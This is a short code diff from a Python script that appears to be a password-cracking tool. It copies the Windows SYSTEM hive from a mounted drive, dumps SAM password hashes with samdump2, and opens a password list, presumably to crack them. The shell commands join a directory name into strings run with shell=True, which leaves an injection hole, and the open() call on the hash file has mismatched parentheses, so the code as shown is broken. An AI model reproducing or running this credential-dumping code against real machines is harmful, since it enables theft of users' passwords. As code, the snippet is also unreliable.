@@ -31,10 +31,8 @@ def animal():
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
     subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)
 
-
-
     with open("targethashes.txt"), "r") as input_file:
-        input_hash = input_file.readlines()
+        input_hash = input_file.readline()
 
     with open(input("Enter Name of Password List: "), "r", errors="ignore") as password_list:
         
